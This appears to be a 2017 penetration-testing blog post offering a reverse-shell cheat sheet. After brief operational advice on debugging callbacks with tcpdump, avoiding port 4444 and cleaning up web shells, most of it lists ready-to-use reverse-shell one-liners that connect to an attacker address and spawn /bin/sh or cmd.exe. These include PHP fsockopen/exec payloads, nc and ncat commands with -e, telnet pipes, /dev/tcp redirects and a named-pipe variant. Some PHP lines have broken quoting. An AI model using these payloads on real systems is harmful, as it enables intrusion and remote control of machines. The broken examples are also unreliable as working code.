---
layout: post
title:  "Reverse Shell Cheat Sheet"
date:   2017-01-17 20:56:00 -0600
---

## Cause everyone posts one

If enumeration is the bread and butter of penetration testing, reverse shells are the cheesecake. Stolen usernames and passwords may be one of the most reliable ways to get into a system, but theres nothing like messing something up a bunch and then finally seeing that reverse shell prompt pop up. These are some quick and easy ones in different formats.

## First, some thoughts

Reverse shells are great, but you need to make sure they get to you. Way too many reverse shells and exploits code the exploit to send reverse shells back to port 4444. If you see this port active in a production environment and can't immediately recognize why, you need to figure it out. You may have been popped by someone who barely knows what they're doing which probably also means someone way worse is already in. 

If you're going to send yourself back a reverse shell, try ports that people should expect to see. Port 80 and 443 are great, but so is DNS. [This](http://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html) is an excellent write up of RCE found in Facebook that had to use outbound DNS to send results back to his listening machine. Amazing stuff. 

If you think it should work and it's not, tcpdump or wireshark your host (if you can) and see what's coming and going. If I'm trying to exploit a web app on port 80 to send back a remote shell, one tcpdump quickie I use is 

~~~
tcpdump -qtpni eth0/tap0/whatever0 host <VICTIMIP> and not port 80 
~~~

That watches traffic for anything coming back and gives you a condensed, simple output for it only on the interface you expect the attack to copme back through (tap0 if you're on a VPN, for example), listening only for the victim host so you don't see a bunch of other noise and excluding the port you know you're going to see traffic on. In this case, since I'm attacking port 80, I'm probably listening on port 443 with a netcat listener. You could specify port 443 only, but this wouldn't catch if you did something wrong in your exploit and are sending the exploit back to the wrong port (we all make mistakes). 


### But bind shells are easier!

And therein lies the problem. Bind shells are great, but they're irresponsible. If you can bind to the port, anyone else can. If you're part of a real engagement for a customer or doing something in house, you can't leave bind shells everywhere, it's like leaving windows open for burglars. If someone is already inside the client's network,  you've just made their job that much easier when your goal is the opposite. Use reverse shells, encrypt when possible, and clean up after yourself. Relatedly, if you're uploading a file to an externally available site like a web shell, don't name it admin.php or shell.php. Use a complex naming schema that can't be brute forced or ideally a tag that can be found repeatedly. Something like remotephone_j1er234.php is harder to brute force and way easier to track down for cleanup.  


## Let's begin!

Don't be lazy. You shouldn't be trying to get a shell back unless you have a good idea of what the underlying OS is. Each one of these can be adjusted and may need to be. It's possible you know you have a linux type OS, but what if bash is in /usr/bin/ instead of /bin/? Do some recon, know what you're working with, and, if you really have every reason to believe you should be getting a shell but you aren't, always assume you've done something wrong. It's usually the safe bet.  

### PHP

This is a very generic PHP reverse shell. It runs PHP inside of itself to send a connection back with /bin/sh

~~~
'<?php  echo shell_exec(php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3"); ?>'
~~~

Here are a lot of variations on a theme. Each one worked for something different (some didn't work at all, but might for you), and others are just interesting.

~~~
'<?php -r fsockopen("<ATTACKIP>",443); exec("/bin/sh -i <&3 >&3 2>&3"); ?>'
'<?php $s=fsockopen("<ATTACKIP>",443);exec("/bin/sh -i <&4 >&4 2>&4");?>'
'<?php exec("/bin/sh | /bin/nc <ATTACKIP> 443");?>'
'<?php $sock=fsockopen("<ATTACKIP>",443);exec("/bin/sh -i <&3 >&3 2>&3");?>'
'<?php set_time_limit (20);$sock=fsockopen("<ATTACKIP>",443);exec("/bin/sh -i <&3 >&3 2>&3");?>'
'<?php $sock=fsockopen("<ATTACKIP>",443);exec("/bin/sh -i >& /dev/tcp/<ATTACKIP>/443 0>&1");?>'
'<?php shell_exec("/bin/sh -i >& /dev/tcp/<ATTACKIP>/443 0>&1");?>'
~~~

No matter what's different with each one, every single one is calling a command shell, sending it over a network connection to the port you want. Every example is using port 443, so adjust that as you need to adjust it. Also, note that it's suspicious to send non-HTTPS traffic over 443, so keep that in mind if you're dealing with deep packet inspection or an attentive analyst. It might be more useful to use meterpreter reverse_https for something like that.

### Ncat and nc

Ncat and nc are great tools. You can do a ton with each one, but ncat is just a whole other level for what it allows you to accomplish. While nc is the traditional tool, ncat comes from the same people who produce nmap and includes tons more features including ssl support and the ability to restrict access! 

Of course, you'll have to work these into your exploit. To create a bind shell that only allows a specific IP to connect to it, use

~~~
ncat -lvp 4445 -e cmd.exe --allow <ATTACKIP> --ssl
~~~

To do this even more safely, use a reverse shell 

~~~
ncat -v <attackIP> 443 -e cmd.exe --ssl
~~~


### Non-netcat Shells

This one is really clunky, but it works when you just can't get anything else working. For this to work, you need two listeners and your shell will show up on the second one. It's a complete mess, but it works and it's just kind of nifty to see.

~~~
telnet <ATTACKIP> 443 | /bin/sh | telnet <ATTACKIP> 444
~~~

This one came from [this](https://twitter.com/webpentest/status/424165659518316544) tweet and it's interesting. 

~~~
/bin/bash -l > /dev/tcp/<ATTACKIP>/<ATTACKPORT> 0<&1 2>&1
~~~

Another interesting telnet shell

~~~
rm -f /tmp/p; mknod /tmp/p p && telnet <ATTACKIP> <ATTACKPORT> 0/tmp/p
~~~




#### Sources

"If I've seen so far, it's because I've stolen the shoulders of giants" or something. 

These are some great resources for some of the shells I've included above. Learn from others, modify it, and share!


[The one](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) everyone seems to link 

[Variations](https://highon.coffee/blog/reverse-shell-cheat-sheet/) on the theme.

[Oldy](http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html) but goody
